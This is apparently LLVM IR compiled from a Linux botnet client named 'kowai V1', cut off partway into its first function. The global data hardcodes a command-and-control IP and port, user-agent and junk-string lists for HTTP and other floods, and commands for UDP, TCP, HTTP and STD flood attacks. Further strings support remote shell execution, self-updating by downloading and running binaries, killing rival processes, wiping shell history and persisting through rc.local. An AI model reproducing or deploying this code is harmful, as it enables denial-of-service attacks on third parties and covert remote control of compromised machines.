; ModuleID = 'bot.c'
source_filename = "bot.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.state_t = type { i32, i8 }
%struct.state_t.1 = type { i32, i8 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.killerinfo = type { i8* }
%struct.__dirstream = type opaque
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque

@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncip = dso_local global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i32 0, i32 0), align 8
@cncport = dso_local global i32 1994, align 4
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@useragents = dso_local global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@rangechoice = dso_local global i32 1, align 4
@hacked = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@fdopen_pids = internal global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@pids = dso_local global i32* null, align 8
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.37 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.39 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.41 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.43 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.44 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.49 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.51 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.53 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.55 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.57 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.60 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.63 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@__const.sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@__const.sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@__const.sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"8UsA.sh\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"slumpthegod\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c" Kowai.old\00", align 1
@.str.108 = private unnamed_addr constant [20 x i8] c"EXECUTED NEW BINARY\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@pgid = dso_local global i32 0, align 4
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1
@scanPid = dso_local global i32 0, align 4
@ourPublicIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
